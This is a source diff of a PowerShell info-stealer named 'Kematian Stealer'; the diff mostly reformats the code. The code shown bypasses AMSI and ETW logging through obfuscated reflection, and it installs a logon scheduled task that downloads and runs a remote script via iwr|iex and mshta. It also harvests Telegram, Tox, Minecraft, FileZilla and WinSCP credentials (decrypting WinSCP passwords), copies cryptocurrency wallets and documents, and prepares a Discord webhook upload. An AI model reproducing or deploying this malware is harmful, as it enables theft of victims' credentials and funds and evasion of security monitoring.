@@ -66,7 +66,7 @@ public static class ProcessUtility
 function CHECK_AND_PATCH {
     ${kematian} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
     ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtlbWF0aWFuLlNldFZhbHVlKCRudWxsLCR0cnVlKQ==")) | &([regex]::Unescape("\u0069\u0065\u0078"))
-    ([Reflection.Assembly]::LoadWithPartialName(('System.Core')).GetType(('System.Diagnostics.Eventing.EventProvider')).GetField(('m_enabled'),('NonPublic,Instance')).SetValue([Ref].Assembly.GetType(('System.Management.Automation.Tracing.PSEtwLogProvider')).GetField(('etwProvider'),('NonPublic,Static')).GetValue($null),0))
+    ([Reflection.Assembly]::LoadWithPartialName(('System.Core')).GetType(('System.Diagnostics.Eventing.EventProvider')).GetField(('m_enabled'), ('NonPublic,Instance')).SetValue([Ref].Assembly.GetType(('System.Management.Automation.Tracing.PSEtwLogProvider')).GetField(('etwProvider'), ('NonPublic,Static')).GetValue($null), 0))
     $kematiancheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
     return $kematiancheck
 }
@@ -82,7 +82,8 @@ function Invoke-TASKS {
         $task_name = "Kematian"
         $task_action = if ($debug) {
             New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
-        } else {
+        }
+        else {
             New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
@@ -145,7 +146,7 @@ function Backup-Data {
     $ftp_clients = "$folderformat\FTP Clients"
 
     $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $ftp_clients)
-    foreach ($folder in $folders) {if (Test-Path $folder) {Remove-Item $folder -Recurse -Force }}
+    foreach ($folder in $folders) { if (Test-Path $folder) { Remove-Item $folder -Recurse -Force } }
     $folders | ForEach-Object {
         New-Item -ItemType Directory -Path $_ -Force | Out-Null
     }
@@ -176,7 +177,7 @@ function Backup-Data {
     $date = Get-Date -Format "r"
     $osversion = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
     $windowsVersion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
-    $buildNumber = $windowsVersion.CurrentBuild;$ubR = $windowsVersion.UBR;$osbuild = "$buildNumber.$ubR" 
+    $buildNumber = $windowsVersion.CurrentBuild; $ubR = $windowsVersion.UBR; $osbuild = "$buildNumber.$ubR" 
     $displayversion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").DisplayVersion
     $mfg = (Get-CimInstance -ClassName Win32_ComputerSystem).Manufacturer
     $model = (Get-CimInstance -ClassName Win32_ComputerSystem).Model
@@ -242,22 +243,30 @@ function Backup-Data {
     function diskdata {
         $disks = Get-WmiObject -Class "Win32_LogicalDisk" -Namespace "root\CIMV2" | Where-Object { $_.Size -gt 0 }
         $results = foreach ($disk in $disks) {
-            $SizeOfDisk = [math]::Round($disk.Size / 1GB, 0)
-            $FreeSpace = [math]::Round($disk.FreeSpace / 1GB, 0)
-            $usedspace = [math]::Round(($disk.Size - $disk.FreeSpace) / 1GB, 2)
-            $FreePercent = [int](($FreeSpace / $SizeOfDisk) * 100)
-            $usedpercent = [int](($usedspace / $SizeOfDisk) * 100)
+            try {
+                $SizeOfDisk = [math]::Round($disk.Size / 1GB, 0)
+                $FreeSpace = [math]::Round($disk.FreeSpace / 1GB, 0)
+                $usedspace = [math]::Round(($disk.Size - $disk.FreeSpace) / 1GB, 2)
+                $FreePercent = [int](($FreeSpace / $SizeOfDisk) * 100)
+                $usedpercent = [int](($usedspace / $SizeOfDisk) * 100)
+            }
+            catch {
+                $SizeOfDisk = 0
+                $FreeSpace = 0
+                $FreePercent = 0
+                $usedspace = 0
+                $usedpercent = 0
+            }
+
             [PSCustomObject]@{
                 Drive             = $disk.Name
                 "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                 "Free Disk Size"  = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, $FreePercent
                 "Used Space"      = "{0:N0} GB ({1:N0} %)" -f $usedspace, $usedpercent
             }
-            Write-Output ""  
         }
         $results | Where-Object { $_.PSObject.Properties.Value -notcontains '' }
     }
-    
     $alldiskinfo = diskdata -wrap -autosize | Format-List | Out-String
     $alldiskinfo = $alldiskinfo.Trim()
 
@@ -308,7 +317,7 @@ function Backup-Data {
     # All Messaging Sessions
     
     # Telegram 
-	Write-Host "[!] Session Grabbing Started" -ForegroundColor Green
+    Write-Host "[!] Session Grabbing Started" -ForegroundColor Green
     function telegramstealer {
         $processname = "telegram"
         $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
@@ -455,11 +464,11 @@ function Backup-Data {
     
     # Tox 
     function tox_stealer {
-            $tox_folder = "$env:appdata\Tox"
-            if (!(Test-Path $tox_folder)) { return }
-            $tox_session = "$folder_messaging\Tox"
-            New-Item -ItemType Directory -Force -Path $tox_session | Out-Null
-            Get-ChildItem -Path "$tox_folder" |  Copy-Item -Destination $tox_session -Recurse -Force
+        $tox_folder = "$env:appdata\Tox"
+        if (!(Test-Path $tox_folder)) { return }
+        $tox_session = "$folder_messaging\Tox"
+        New-Item -ItemType Directory -Force -Path $tox_session | Out-Null
+        Get-ChildItem -Path "$tox_folder" |  Copy-Item -Destination $tox_session -Recurse -Force
     }
     tox_stealer
 
@@ -482,36 +491,36 @@ function Backup-Data {
 
     # Minecraft 
     function minecraftstealer {
-	$minecraft_session = "$folder_gaming\Minecraft"
-    New-Item -ItemType Directory -Force -Path $minecraft_session | Out-Null
-    $minecraft_paths = @{
-        "Minecraft" = @{
-            "Intent"          = Join-Path $env:userprofile "intentlauncher\launcherconfig"
-            "Lunar"           = Join-Path $env:userprofile ".lunarclient\settings\game\accounts.json"
-            "TLauncher"       = Join-Path $env:userprofile "AppData\Roaming\.minecraft\TlauncherProfiles.json"
-            "Feather"         = Join-Path $env:userprofile "AppData\Roaming\.feather\accounts.json"
-            "Meteor"          = Join-Path $env:userprofile "AppData\Roaming\.minecraft\meteor-client\accounts.nbt"
-            "Impact"          = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Impact\alts.json"
-            "Novoline"        = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Novoline\alts.novo"
-            "CheatBreakers"   = Join-Path $env:userprofile "AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
-            "Microsoft Store" = Join-Path $env:userprofile "AppData\Roaming\.minecraft\launcher_accounts_microsoft_store.json"
-            "Rise"            = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Rise\alts.txt"
-            "Rise (Intent)"   = Join-Path $env:userprofile "intentlauncher\Rise\alts.txt"
-            "Paladium"        = Join-Path $env:userprofile "AppData\Roaming\paladium-group\accounts.json"
-            "PolyMC"          = Join-Path $env:userprofile "AppData\Roaming\PolyMC\accounts.json"
-            "Badlion"         = Join-Path $env:userprofile "AppData\Roaming\Badlion Client\accounts.json"
-        }
-    } 
-    foreach ($launcher in $minecraft_paths.Keys) {
-        foreach ($pathName in $minecraft_paths[$launcher].Keys) {
-            $sourcePath = $minecraft_paths[$launcher][$pathName]
-            if (Test-Path $sourcePath) {
-                $destination = Join-Path -Path $minecraft_session -ChildPath $pathName
-                New-Item -ItemType Directory -Path $destination -Force | Out-Null
-                Copy-Item -Path $sourcePath -Destination $destination -Recurse -Force
+        $minecraft_session = "$folder_gaming\Minecraft"
+        New-Item -ItemType Directory -Force -Path $minecraft_session | Out-Null
+        $minecraft_paths = @{
+            "Minecraft" = @{
+                "Intent"          = Join-Path $env:userprofile "intentlauncher\launcherconfig"
+                "Lunar"           = Join-Path $env:userprofile ".lunarclient\settings\game\accounts.json"
+                "TLauncher"       = Join-Path $env:userprofile "AppData\Roaming\.minecraft\TlauncherProfiles.json"
+                "Feather"         = Join-Path $env:userprofile "AppData\Roaming\.feather\accounts.json"
+                "Meteor"          = Join-Path $env:userprofile "AppData\Roaming\.minecraft\meteor-client\accounts.nbt"
+                "Impact"          = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Impact\alts.json"
+                "Novoline"        = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Novoline\alts.novo"
+                "CheatBreakers"   = Join-Path $env:userprofile "AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
+                "Microsoft Store" = Join-Path $env:userprofile "AppData\Roaming\.minecraft\launcher_accounts_microsoft_store.json"
+                "Rise"            = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Rise\alts.txt"
+                "Rise (Intent)"   = Join-Path $env:userprofile "intentlauncher\Rise\alts.txt"
+                "Paladium"        = Join-Path $env:userprofile "AppData\Roaming\paladium-group\accounts.json"
+                "PolyMC"          = Join-Path $env:userprofile "AppData\Roaming\PolyMC\accounts.json"
+                "Badlion"         = Join-Path $env:userprofile "AppData\Roaming\Badlion Client\accounts.json"
             }
-         }
-      }
+        } 
+        foreach ($launcher in $minecraft_paths.Keys) {
+            foreach ($pathName in $minecraft_paths[$launcher].Keys) {
+                $sourcePath = $minecraft_paths[$launcher][$pathName]
+                if (Test-Path $sourcePath) {
+                    $destination = Join-Path -Path $minecraft_session -ChildPath $pathName
+                    New-Item -ItemType Directory -Path $destination -Force | Out-Null
+                    Copy-Item -Path $sourcePath -Destination $destination -Recurse -Force
+                }
+            }
+        }
     }
     minecraftstealer
 
@@ -621,7 +630,7 @@ function Backup-Data {
         $FileZillafolder = "$env:appdata\FileZilla"
         if (!(Test-Path $FileZillafolder)) { return }
         $filezilla_hosts = "$ftp_clients\FileZilla"
-		New-Item -ItemType Directory -Force -Path $filezilla_hosts | Out-Null
+        New-Item -ItemType Directory -Force -Path $filezilla_hosts | Out-Null
         $recentServersXml = Join-Path -Path $FileZillafolder -ChildPath 'recentservers.xml'
         $siteManagerXml = Join-Path -Path $FileZillafolder -ChildPath 'sitemanager.xml'
         function ParseServerInfo {
@@ -631,7 +640,7 @@ function Backup-Data {
             $serverPort = $matches.Groups[2].Value
             $serverUser = [regex]::Match($xmlContent, "<User>(.*?)</User>").Groups[1].Value
             # Check if both User and Pass are blank
-            if ([string]::IsNullOrWhiteSpace($serverUser)) {return "Host: $serverHost `nPort: $serverPort`n"}
+            if ([string]::IsNullOrWhiteSpace($serverUser)) { return "Host: $serverHost `nPort: $serverPort`n" }
             # if User is not blank, continue with authentication details
             $encodedPass = [regex]::Match($xmlContent, "<Pass encoding=`"base64`">(.*?)</Pass>").Groups[1].Value
             $decodedPass = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPass))
@@ -650,89 +659,90 @@ function Backup-Data {
             }
         }
         $serversInfo | Out-File -FilePath "$filezilla_hosts\Hosts.txt" -Force
-		 Write-Host "[!] Filezilla Session information saved" -ForegroundColor Green
+        Write-Host "[!] Filezilla Session information saved" -ForegroundColor Green
     }
     filezilla_stealer
 	
-	#  WinSCP  
-	function Get-WinSCPSessions {
-    $registryPath = "SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
-	$winscp_session = "$ftp_clients\WinSCP"
-	New-Item -ItemType Directory -Force -Path $winscp_session | Out-Null
-	$outputPath = "$winscp_session\WinSCP-sessions.txt"
-    $output = "WinSCP Sessions`n`n"
-    $hive = [UInt32] "2147483649" # HKEY_CURRENT_USER
-    function Get-RegistryValue {
-        param ([string]$subKey,[string]$valueName)
-        $result = Invoke-WmiMethod -Namespace "root\default" -Class StdRegProv -Name GetStringValue -ArgumentList $hive, $subKey, $valueName
-        return $result.sValue
-    }
-    function Get-RegistrySubKeys {
-        param ([string]$subKey)
-        $result = Invoke-WmiMethod -Namespace "root\default" -Class StdRegProv -Name EnumKey -ArgumentList $hive, $subKey
-        return $result.sNames
-    }
-    $sessionKeys = Get-RegistrySubKeys -subKey $registryPath
-    if ($null -eq $sessionKeys) {
-        Write-Host "[!] Failed to enumerate registry keys under $registryPath" -ForegroundColor Red
-        return
-    }
-	function DecryptNextCharacterWinSCP {
-    param ([string]$remainingPass)
-    $Magic = 163
-    $flagAndPass = "" | Select-Object -Property flag, remainingPass
-    $firstval = ("0123456789ABCDEF".indexOf($remainingPass[0]) * 16)
-    $secondval = "0123456789ABCDEF".indexOf($remainingPass[1])
-    $Added = $firstval + $secondval
-    $decryptedResult = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256
-    $flagAndPass.flag = $decryptedResult
-    $flagAndPass.remainingPass = $remainingPass.Substring(2)
-    return $flagAndPass
-    }
-	function DecryptWinSCPPassword {
-    param ([string]$SessionHostname,[string]$SessionUsername,[string]$Password)
-    $CheckFlag = 255
-    $Magic = 163
-    $key = $SessionHostname + $SessionUsername
-    $values = DecryptNextCharacterWinSCP -remainingPass $Password
-    $storedFlag = $values.flag
-    if ($values.flag -eq $CheckFlag) {
-        $values.remainingPass = $values.remainingPass.Substring(2)
-        $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
-    }
-    $len = $values.flag
-    $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
-    $values.remainingPass = $values.remainingPass.Substring(($values.flag * 2))
-    $finalOutput = ""
-    for ($i = 0; $i -lt $len; $i++) {
-        $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
-        $finalOutput += [char]$values.flag
-    }
-    if ($storedFlag -eq $CheckFlag) {
-        return $finalOutput.Substring($key.Length)
-    }
-    return $finalOutput
-    }
-   foreach ($sessionKey in $sessionKeys) {
-        $sessionName = $sessionKey
-        $sessionPath = "$registryPath\$sessionName"
-        $hostname = Get-RegistryValue -subKey $sessionPath -valueName "HostName"
-        $username = Get-RegistryValue -subKey $sessionPath -valueName "UserName"
-        $encryptedPassword = Get-RegistryValue -subKey $sessionPath -valueName "Password"
-        if ($encryptedPassword) {
-            $password = DecryptWinSCPPassword -SessionHostname $hostname -SessionUsername $username -Password $encryptedPassword
-        } else {
-            $password = "No password saved"
+    #  WinSCP  
+    function Get-WinSCPSessions {
+        $registryPath = "SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
+        $winscp_session = "$ftp_clients\WinSCP"
+        New-Item -ItemType Directory -Force -Path $winscp_session | Out-Null
+        $outputPath = "$winscp_session\WinSCP-sessions.txt"
+        $output = "WinSCP Sessions`n`n"
+        $hive = [UInt32] "2147483649" # HKEY_CURRENT_USER
+        function Get-RegistryValue {
+            param ([string]$subKey, [string]$valueName)
+            $result = Invoke-WmiMethod -Namespace "root\default" -Class StdRegProv -Name GetStringValue -ArgumentList $hive, $subKey, $valueName
+            return $result.sValue
         }
-        $output += "Session  : $sessionName`n"
-        $output += "Hostname : $hostname`n"
-        $output += "Username : $username`n"
-        $output += "Password : $password`n`n"
+        function Get-RegistrySubKeys {
+            param ([string]$subKey)
+            $result = Invoke-WmiMethod -Namespace "root\default" -Class StdRegProv -Name EnumKey -ArgumentList $hive, $subKey
+            return $result.sNames
+        }
+        $sessionKeys = Get-RegistrySubKeys -subKey $registryPath
+        if ($null -eq $sessionKeys) {
+            Write-Host "[!] Failed to enumerate registry keys under $registryPath" -ForegroundColor Red
+            return
+        }
+        function DecryptNextCharacterWinSCP {
+            param ([string]$remainingPass)
+            $Magic = 163
+            $flagAndPass = "" | Select-Object -Property flag, remainingPass
+            $firstval = ("0123456789ABCDEF".indexOf($remainingPass[0]) * 16)
+            $secondval = "0123456789ABCDEF".indexOf($remainingPass[1])
+            $Added = $firstval + $secondval
+            $decryptedResult = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256
+            $flagAndPass.flag = $decryptedResult
+            $flagAndPass.remainingPass = $remainingPass.Substring(2)
+            return $flagAndPass
+        }
+        function DecryptWinSCPPassword {
+            param ([string]$SessionHostname, [string]$SessionUsername, [string]$Password)
+            $CheckFlag = 255
+            $Magic = 163
+            $key = $SessionHostname + $SessionUsername
+            $values = DecryptNextCharacterWinSCP -remainingPass $Password
+            $storedFlag = $values.flag
+            if ($values.flag -eq $CheckFlag) {
+                $values.remainingPass = $values.remainingPass.Substring(2)
+                $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
+            }
+            $len = $values.flag
+            $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
+            $values.remainingPass = $values.remainingPass.Substring(($values.flag * 2))
+            $finalOutput = ""
+            for ($i = 0; $i -lt $len; $i++) {
+                $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
+                $finalOutput += [char]$values.flag
+            }
+            if ($storedFlag -eq $CheckFlag) {
+                return $finalOutput.Substring($key.Length)
+            }
+            return $finalOutput
+        }
+        foreach ($sessionKey in $sessionKeys) {
+            $sessionName = $sessionKey
+            $sessionPath = "$registryPath\$sessionName"
+            $hostname = Get-RegistryValue -subKey $sessionPath -valueName "HostName"
+            $username = Get-RegistryValue -subKey $sessionPath -valueName "UserName"
+            $encryptedPassword = Get-RegistryValue -subKey $sessionPath -valueName "Password"
+            if ($encryptedPassword) {
+                $password = DecryptWinSCPPassword -SessionHostname $hostname -SessionUsername $username -Password $encryptedPassword
+            }
+            else {
+                $password = "No password saved"
+            }
+            $output += "Session  : $sessionName`n"
+            $output += "Hostname : $hostname`n"
+            $output += "Username : $username`n"
+            $output += "Password : $password`n`n"
+        }
+        $output | Out-File -FilePath $outputPath
+        Write-Host "[!] WinSCP Session information saved" -ForegroundColor Green
     }
-    $output | Out-File -FilePath $outputPath
-    Write-Host "[!] WinSCP Session information saved" -ForegroundColor Green
-   }
-   Get-WinSCPSessions
+    Get-WinSCPSessions
 
     # Thunderbird Exfil
     if (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
@@ -742,41 +752,41 @@ function Backup-Data {
     }
 
     function Local_Crypto_Wallets {
-    $wallet_paths = @{
-                "Local Wallets" = @{
-                    "Armory"            = Join-Path $env:appdata      "\Armory\*.wallet"
-                    "Atomic"            = Join-Path $env:appdata      "\Atomic\Local Storage\leveldb"
-                    "Bitcoin"           = Join-Path $env:appdata      "\Bitcoin\wallets"
-        			"Bytecoin"          = Join-Path $env:appdata      "\bytecoin\*.wallet"
-                    "Coinomi"           = Join-Path $env:localappdata "Coinomi\Coinomi\wallets"
-                    "Dash"              = Join-Path $env:appdata      "\DashCore\wallets"
-                    "Electrum"          = Join-Path $env:appdata      "\Electrum\wallets"
-                    "Ethereum"          = Join-Path $env:appdata      "\Ethereum\keystore"
-                    "Exodus"            = Join-Path $env:appdata      "\Exodus\exodus.wallet"
-                    "Guarda"            = Join-Path $env:appdata      "\Guarda\Local Storage\leveldb"
-                    "com.liberty.jaxx"  = Join-Path $env:appdata      "\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb"
-        			"Litecoin"          = Join-Path $env:appdata      "\Litecoin\wallets"
-        			"MyMonero"          = Join-Path $env:appdata      "\MyMonero\*.mmdbdoc_v1"
-        			"Monero GUI"        = Join-Path $env:appdata      "Documents\Monero\wallets\"
-                }
+        $wallet_paths = @{
+            "Local Wallets" = @{
+                "Armory"           = Join-Path $env:appdata      "\Armory\*.wallet"
+                "Atomic"           = Join-Path $env:appdata      "\Atomic\Local Storage\leveldb"
+                "Bitcoin"          = Join-Path $env:appdata      "\Bitcoin\wallets"
+                "Bytecoin"         = Join-Path $env:appdata      "\bytecoin\*.wallet"
+                "Coinomi"          = Join-Path $env:localappdata "Coinomi\Coinomi\wallets"
+                "Dash"             = Join-Path $env:appdata      "\DashCore\wallets"
+                "Electrum"         = Join-Path $env:appdata      "\Electrum\wallets"
+                "Ethereum"         = Join-Path $env:appdata      "\Ethereum\keystore"
+                "Exodus"           = Join-Path $env:appdata      "\Exodus\exodus.wallet"
+                "Guarda"           = Join-Path $env:appdata      "\Guarda\Local Storage\leveldb"
+                "com.liberty.jaxx" = Join-Path $env:appdata      "\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb"
+                "Litecoin"         = Join-Path $env:appdata      "\Litecoin\wallets"
+                "MyMonero"         = Join-Path $env:appdata      "\MyMonero\*.mmdbdoc_v1"
+                "Monero GUI"       = Join-Path $env:appdata      "Documents\Monero\wallets\"
             }
-            $zephyr_path = "$env:appdata\Zephyr\wallets"
-    		New-Item -ItemType Directory -Path "$folder_crypto\Zephyr" -Force | Out-Null
-            if (Test-Path $zephyr_path) {Get-ChildItem -Path $zephyr_path -Filter "*.keys" -Recurse | Copy-Item -Destination "$folder_crypto\Zephyr" -Force	}	
-            foreach ($wallet in $wallet_paths.Keys) {
+        }
+        $zephyr_path = "$env:appdata\Zephyr\wallets"
+        New-Item -ItemType Directory -Path "$folder_crypto\Zephyr" -Force | Out-Null
+        if (Test-Path $zephyr_path) { Get-ChildItem -Path $zephyr_path -Filter "*.keys" -Recurse | Copy-Item -Destination "$folder_crypto\Zephyr" -Force	}	
+        foreach ($wallet in $wallet_paths.Keys) {
             foreach ($pathName in $wallet_paths[$wallet].Keys) {
                 $sourcePath = $wallet_paths[$wallet][$pathName]
                 if (Test-Path $sourcePath) {
                     $destination = Join-Path -Path $folder_crypto -ChildPath $pathName
                     New-Item -ItemType Directory -Path $destination -Force | Out-Null
-    				Copy-Item -Path $sourcePath -Recurse -Destination $destination -Force
+                    Copy-Item -Path $sourcePath -Recurse -Destination $destination -Force
                 }
-             }
-          }
+            }
+        }
     }
     Local_Crypto_Wallets
 	
-	Write-Host "[!] Session Grabbing Ended" -ForegroundColor Green
+    Write-Host "[!] Session Grabbing Ended" -ForegroundColor Green
 
     # Had to do it like this due to https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:PowerShell/EmpireGetScreenshot.A&threatId=-2147224978
     #webcam function doesn't work on anything with .NET 8 or higher. Fix it if you want to use it and make a PR. I tried but I keep getting errors writting to protected memory lol.
@@ -790,20 +800,20 @@ function Backup-Data {
     $invokewebcam.WaitForExit()
 
     # Works since most victims will have a weak password which can be bruteforced
-    function ExportPrivateKeys {
-    $privatekeysfolder = "$important_files\Certificates and Private Keys"
-    New-Item -ItemType Directory -Path $privatekeysfolder -Force | Out-Null
-    $sourceDirectory = "$env:userprofile"
-    $fileExtensions = @("*.pem", "*.ppk", "*.key", "*.pfx")
-
-    foreach ($extension in $fileExtensions) {
-        $foundFiles = Get-ChildItem -Path $sourceDirectory -Filter $extension -File -Recurse
-        foreach ($file in $foundFiles) {
-            Copy-Item -Path $file.FullName -Destination $privatekeysfolder -Force
-            }
-         }
-    }
-    ExportPrivateKeys
+    #function ExportPrivateKeys {
+    #    $privatekeysfolder = "$important_files\Certificates and Private Keys"
+    #    New-Item -ItemType Directory -Path $privatekeysfolder -Force | Out-Null
+    #    $sourceDirectory = "$env:userprofile"
+    #    $fileExtensions = @("*.pem", "*.ppk", "*.key", "*.pfx")
+    #
+    #    foreach ($extension in $fileExtensions) {
+    #        $foundFiles = Get-ChildItem -Path $sourceDirectory -Filter $extension -File -Recurse
+    #        foreach ($file in $foundFiles) {
+    #            Copy-Item -Path $file.FullName -Destination $privatekeysfolder -Force
+    #        }
+    #    }
+    #}
+    #ExportPrivateKeys
 
     function FilesGrabber {
         $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")
@@ -1077,11 +1087,11 @@ function Backup-Data {
 
     Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
     $embed_and_body = @{
-        "username"    = "Kematian"
-        "color"       = "15105570"
-        "avatar_url"  = "https://i.imgur.com/6w6qWCB.jpeg"
-        "url"         = "https://discord.com/invite/WJCNUpxnrE"
-        "embeds"      = @(
+        "username"   = "Kematian"
+        "color"      = "15105570"
+        "avatar_url" = "https://i.imgur.com/6w6qWCB.jpeg"
+        "url"        = "https://discord.com/invite/WJCNUpxnrE"
+        "embeds"     = @(
             @{
                 "title"       = "Kematian Stealer"
                 "url"         = "https://github.com/ChildrenOfYahweh/Kematian-Stealer"
